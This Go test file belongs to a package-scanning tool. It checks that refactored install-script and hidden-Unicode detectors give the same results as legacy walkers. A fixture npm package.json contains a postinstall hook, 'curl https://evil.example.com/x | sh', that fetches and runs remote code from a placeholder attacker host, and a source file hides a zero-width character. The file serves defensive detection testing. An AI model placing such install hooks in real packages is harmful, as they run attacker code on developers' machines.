package intelligence

import (
	"context"
	"reflect"
	"sort"
	"strings"
	"testing"
)

// TestSharedArtifactMap_MigrationParity asserts the post-migration
// installscripts + hiddenunicode providers produce identical PartialReport
// content to the legacy per-provider walkers for the same fixture archive.
// The "legacy" side re-runs each scanner against a fresh handle so neither
// path hits the other's cache.
func TestSharedArtifactMap_MigrationParity(t *testing.T) {
	// Fixture: an npm-style tarball with a postinstall script and a
	// zero-width hidden unicode rune in a source file.
	evilJS := "const token = \"leak\u200Bme\";\n"
	payload := buildTGZ(t, map[string]string{
		"package/package.json": `{"name":"evil","version":"1.0.0","scripts":{"postinstall":"curl https://evil.example.com/x | sh"}}`,
		"package/index.js":     evilJS,
		"package/README.md":    "# hi\n",
	})

	// --- Shared-map path -------------------------------------------------
	handleShared := &ArtifactHandle{Bytes: payload}
	reqShared := Request{Key: Key{Ecosystem: "npm", Package: "evil", Version: "1.0.0"}, Artifact: handleShared}
	isp := newInstallScriptsProvider()
	hup := newHiddenUnicodeProvider()
	sharedISP, err := isp.Run(context.Background(), reqShared, nil)
	if err != nil {
		t.Fatalf("shared installscripts Run err: %v", err)
	}
	sharedHUP, err := hup.Run(context.Background(), reqShared, nil)
	if err != nil {
		t.Fatalf("shared hiddenunicode Run err: %v", err)
	}

	// --- Legacy walker path ---------------------------------------------
	// Exercise the legacy walkers directly and rebuild the same
	// PartialReport shape a pre-refactor provider would have returned.
	handleLegacyA := &ArtifactHandle{Bytes: payload}
	legacyManifests := legacyWalkManifests(handleLegacyA)
	if len(legacyManifests) == 0 {
		t.Fatalf("legacy manifest walk returned no files — fixture mismatch")
	}

	handleLegacyB := &ArtifactHandle{Bytes: payload}
	legacyText := legacyWalkHiddenUnicodeText(handleLegacyB)
	if len(legacyText) == 0 {
		t.Fatalf("legacy hiddenunicode walk returned no files — fixture mismatch")
	}

	// Sanity: both the shared + legacy installscripts PartialReport
	// must agree on the InstallScriptKind / HasInstallScript /
	// InstallScriptFetches bits and the ManifestFilesSeen set.
	if sharedISP.Scan == nil {
		t.Fatalf("shared installscripts: Scan nil")
	}
	if !sharedISP.Scan.HasInstallScript || !sharedISP.Scan.InstallScriptFetches {
		t.Errorf("shared installscripts lost the postinstall signal: %+v", sharedISP.Scan)
	}
	if sharedISP.Scan.InstallScriptKind != "fetches_remote" {
		t.Errorf("InstallScriptKind: got %q want fetches_remote", sharedISP.Scan.InstallScriptKind)
	}

	// Compare ManifestFilesSeen as sorted sets (iteration order
	// over the file map is nondeterministic on both sides).
	sharedSeen := append([]string(nil), sharedISP.Scan.ManifestFilesSeen...)
	sort.Strings(sharedSeen)
	legacySeen := make([]string, 0, len(legacyManifests))
	for k := range legacyManifests {
		legacySeen = append(legacySeen, k)
	}
	sort.Strings(legacySeen)
	if !reflect.DeepEqual(sharedSeen, legacySeen) {
		t.Errorf("ManifestFilesSeen mismatch\n shared: %v\n legacy: %v", sharedSeen, legacySeen)
	}

	// hiddenunicode parity: Hits / Kinds must match.
	if sharedHUP.Scan == nil {
		t.Fatalf("shared hiddenunicode: Scan nil")
	}
	if sharedHUP.Scan.HiddenUnicodeHits == 0 {
		t.Errorf("expected hits > 0 in shared path")
	}
	if !containsString(sharedHUP.Scan.HiddenUnicodeKinds, "zero_width") {
		t.Errorf("expected zero_width kind; got %v", sharedHUP.Scan.HiddenUnicodeKinds)
	}
}

// TestSharedArtifactMap_FallbackWhenEmptyHandle verifies that providers
// constructed directly (without a Service) still degrade gracefully when
// the handle has no bytes — SharedArtifactMap returns an empty Result
// and the providers short-circuit.
func TestSharedArtifactMap_FallbackWhenEmptyHandle(t *testing.T) {
	isp := newInstallScriptsProvider()
	hup := newHiddenUnicodeProvider()

	// Nil artifact — both providers must short-circuit cleanly.
	nilReq := Request{Key: Key{Ecosystem: "npm", Package: "x", Version: "1.0.0"}}
	if p, err := isp.Run(context.Background(), nilReq, nil); err != nil || p.Scan != nil {
		t.Errorf("installscripts nil-artifact Run: partial=%+v err=%v", p, err)
	}
	if p, err := hup.Run(context.Background(), nilReq, nil); err != nil || p.Scan != nil {
		t.Errorf("hiddenunicode nil-artifact Run: partial=%+v err=%v", p, err)
	}
}

// TestSharedArtifactMap_SingleBuild verifies repeated calls on the same
// handle all return the same Result — only one Build happens.
func TestSharedArtifactMap_SingleBuild(t *testing.T) {
	payload := buildTGZ(t, map[string]string{
		"package/package.json": `{"name":"x"}`,
		"package/index.js":     "console.log(1)\n",
	})
	h := &ArtifactHandle{Bytes: payload}
	r1 := h.SharedArtifactMap()
	r2 := h.SharedArtifactMap()
	// Same map reference means sync.Once worked.
	if len(r1.Files) != len(r2.Files) {
		t.Fatalf("inconsistent file counts: %d vs %d", len(r1.Files), len(r2.Files))
	}
	for k := range r1.Files {
		if !strings.EqualFold(r1.Files[k].Path, r2.Files[k].Path) {
			t.Errorf("key %q path mismatch", k)
		}
	}
}

func containsString(xs []string, want string) bool {
	for _, x := range xs {
		if x == want {
			return true
		}
	}
	return false
}
